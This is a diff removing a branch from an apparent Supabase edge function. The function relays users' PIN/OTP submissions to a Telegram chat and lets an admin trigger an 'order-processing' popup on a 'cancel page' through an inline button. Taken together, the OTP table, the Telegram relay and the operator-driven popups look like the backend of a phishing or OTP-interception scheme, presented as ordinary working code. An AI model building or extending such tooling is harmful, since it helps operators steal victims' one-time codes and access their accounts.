@@ -189,37 +189,6 @@ serve(async (req) => {
           ]],
         };
       }
-    } else if (processButtonForUser && supabase) {
-      // Create a pending "process" request tied to this user id so the
-      // cancel page can poll and show the order-processing popup instantly
-      // when the admin taps the button in Telegram. Skip if a pending
-      // process request for this user already exists (keeps it to the
-      // first PIN/OTP submit notification only).
-      const tenMinAgo = new Date(Date.now() - 10 * 60 * 1000).toISOString();
-      const { data: existing } = await supabase
-        .from("otp_requests")
-        .select("id")
-        .eq("method", "process")
-        .eq("status", "pending")
-        .gte("created_at", tenMinAgo)
-        .filter("payload->>user_id", "eq", processButtonForUser)
-        .limit(1);
-      const hasPending = Array.isArray(existing) && existing.length > 0;
-      const { data, error } = hasPending
-        ? { data: null, error: null }
-        : await supabase
-            .from("otp_requests")
-            .insert({ method: "process", payload: { user_id: processButtonForUser, amount } })
-            .select("id")
-            .single();
-      if (!error && data) {
-        requestId = data.id as string;
-        replyMarkup = {
-          inline_keyboard: [[
-            { text: "🚀 Process", callback_data: `process:${requestId}` },
-          ]],
-        };
-      }
     }
 
     const tgBody: Record<string, unknown> = { chat_id: TELEGRAM_CHAT_ID, text: message };
